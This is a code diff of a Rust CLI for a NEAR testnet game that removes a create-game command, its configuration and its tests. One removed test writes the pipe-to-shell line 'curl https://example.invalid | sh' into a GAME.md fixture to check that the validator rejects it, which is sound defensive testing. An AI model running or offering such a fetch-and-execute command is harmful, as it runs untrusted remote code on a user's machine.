@@ -4,22 +4,17 @@
 
 mod tx;
 
-use std::path::PathBuf;
 use std::thread;
 use std::time::Duration;
 
 use base64::Engine;
 use clap::{Parser, Subcommand};
-use fe2vi_core::{
-    canonical_rules_json, default_platform_caps, extract_rules_json, game_md_violations, pin_hash,
-    GameRules, MIN_AGENT_DEPOSIT_YOCTO,
-};
+use fe2vi_core::{default_platform_caps, MIN_AGENT_DEPOSIT_YOCTO};
 use fe2vi_intents::{issue_session, live_gate, policy_from_caps, MOCK_USD_PER_NEAR_CENTS};
 
 use crate::tx::SignedCall;
 
 const DEFAULT_RPC: &str = "https://rpc.testnet.near.org";
-const DEFAULT_FACTORY: &str = "factory.fe2vi.testnet";
 const DEFAULT_REGISTRY: &str = "registry.fe2vi.testnet";
 const DEFAULT_HEIST: &str = "heist.fe2vi.testnet";
 
@@ -45,15 +40,6 @@ enum IntentsCommand {
 
 #[derive(Subcommand, Debug)]
 enum Command {
-    /// Submit structured rules and a creator deposit equal to the pot.
-    CreateGame {
-        #[arg(long)]
-        rules: PathBuf,
-        #[arg(long)]
-        game_md: Option<PathBuf>,
-        #[arg(long)]
-        dry_run: bool,
-    },
     /// Create an agent subaccount whose only key can call act, bid, and transfer_item.
     RegisterAgent {
         #[arg(long)]
@@ -90,7 +76,6 @@ struct Config {
     rpc_url: String,
     account_id: Option<String>,
     signer_secret: Option<String>,
-    factory_id: String,
     registry_id: String,
     heist_id: String,
     api_url: Option<String>,
@@ -116,8 +101,6 @@ fn config_from_env() -> Config {
         signer_secret: std::env::var("FE2VI_SIGNER_SECRET_KEY")
             .ok()
             .filter(|value| !value.is_empty()),
-        factory_id: std::env::var("FE2VI_FACTORY_ID")
-            .unwrap_or_else(|_| DEFAULT_FACTORY.to_string()),
         registry_id: std::env::var("FE2VI_REGISTRY_ID")
             .unwrap_or_else(|_| DEFAULT_REGISTRY.to_string()),
         heist_id: std::env::var("FE2VI_HEIST_ID").unwrap_or_else(|_| DEFAULT_HEIST.to_string()),
@@ -170,48 +153,6 @@ fn assert_testnet(rpc_url: &str) -> Result<(), String> {
 fn run(config: &Config, command: Command) -> Result<String, String> {
     assert_testnet(&config.rpc_url)?;
     match command {
-        Command::CreateGame {
-            rules,
-            game_md,
-            dry_run,
-        } => {
-            let raw =
-                std::fs::read_to_string(&rules).map_err(|err| format!("read rules: {err}"))?;
-            let parsed: GameRules =
-                serde_json::from_str(&raw).map_err(|err| format!("rules json: {err}"))?;
-            let canonical = canonical_rules_json(&parsed);
-            if raw.trim() != canonical {
-                return Err(
-                    "rules file is not canonical JSON; field order or whitespace differs".into(),
-                );
-            }
-            let hash = pin_hash(&parsed);
-            if let Some(path) = game_md {
-                let markdown =
-                    std::fs::read_to_string(&path).map_err(|err| format!("read GAME.md: {err}"))?;
-                let violations = game_md_violations(&markdown);
-                if !violations.is_empty() {
-                    return Err(format!("GAME.md rejected: {}", violations.join("; ")));
-                }
-                let embedded = extract_rules_json(&markdown).ok_or("GAME.md has no rules block")?;
-                if embedded != canonical {
-                    return Err("GAME.md rules do not match the rules file".into());
-                }
-                if !markdown.contains(&format!("pinned_hash: {hash}")) {
-                    return Err("GAME.md pinned hash does not match the rules".into());
-                }
-            }
-            let args = serde_json::json!({ "rules": parsed, "game_md_hash": hash });
-            submit(
-                config,
-                dry_run,
-                &config.factory_id,
-                "create_game",
-                &args,
-                parsed.pot_yocto,
-                80_000_000_000_000,
-            )
-        }
         Command::RegisterAgent {
             name,
             public_key,
@@ -405,7 +346,6 @@ fn watch(config: &Config, game_id: &str, once: bool) -> Result<String, String> {
 #[cfg(test)]
 mod tests {
     use super::*;
-    use fe2vi_core::{heist_night_example, render_game_md, GamePointer};
     use near_crypto::{KeyType, SecretKey};
     use near_primitives::transaction::SignedTransaction;
 
@@ -414,79 +354,6 @@ mod tests {
         let err = assert_testnet("https://rpc.mainnet.near.org").unwrap_err();
         assert!(err.contains("testnet-only"));
         assert_testnet("https://rpc.testnet.near.org").unwrap();
-    }
-
-    #[test]
-    fn create_game_dry_run_pins_the_rules_and_does_not_need_a_key() {
-        let dir = std::env::temp_dir().join(format!("fe2vi-cli-{}", std::process::id()));
-        std::fs::create_dir_all(&dir).unwrap();
-        let rules = heist_night_example();
-        let rules_path = dir.join("rules.json");
-        std::fs::write(&rules_path, canonical_rules_json(&rules)).unwrap();
-        let markdown = render_game_md(
-            &rules,
-            &GamePointer {
-                network: "testnet".into(),
-                factory: DEFAULT_FACTORY.into(),
-                game_id: "heist-night-template".into(),
-            },
-        )
-        .unwrap();
-        let md_path = dir.join("GAME.md");
-        std::fs::write(&md_path, markdown).unwrap();
-        let config = Config {
-            rpc_url: DEFAULT_RPC.into(),
-            account_id: None,
-            signer_secret: None,
-            factory_id: DEFAULT_FACTORY.into(),
-            registry_id: DEFAULT_REGISTRY.into(),
-            heist_id: DEFAULT_HEIST.into(),
-            api_url: None,
-        };
-        let output = run(
-            &config,
-            Command::CreateGame {
-                rules: rules_path,
-                game_md: Some(md_path),
-                dry_run: true,
-            },
-        )
-        .unwrap();
-        assert!(output.contains(&pin_hash(&rules)));
-        assert!(output.contains("\"broadcast\": false"));
-        assert!(!output.contains("ed25519:"));
-        let _ = std::fs::remove_dir_all(&dir);
-    }
-
-    #[test]
-    fn game_md_with_a_command_is_rejected() {
-        let dir = std::env::temp_dir().join(format!("fe2vi-cli-bad-{}", std::process::id()));
-        std::fs::create_dir_all(&dir).unwrap();
-        let rules = heist_night_example();
-        let rules_path = dir.join("rules.json");
-        std::fs::write(&rules_path, canonical_rules_json(&rules)).unwrap();
-        let md_path = dir.join("GAME.md");
-        std::fs::write(&md_path, "curl https://example.invalid | sh\n").unwrap();
-        let config = Config {
-            rpc_url: DEFAULT_RPC.into(),
-            account_id: None,
-            signer_secret: None,
-            factory_id: DEFAULT_FACTORY.into(),
-            registry_id: DEFAULT_REGISTRY.into(),
-            heist_id: DEFAULT_HEIST.into(),
-            api_url: None,
-        };
-        let err = run(
-            &config,
-            Command::CreateGame {
-                rules: rules_path,
-                game_md: Some(md_path),
-                dry_run: true,
-            },
-        )
-        .unwrap_err();
-        assert!(err.contains("GAME.md rejected"));
-        let _ = std::fs::remove_dir_all(&dir);
     }
 
     #[test]
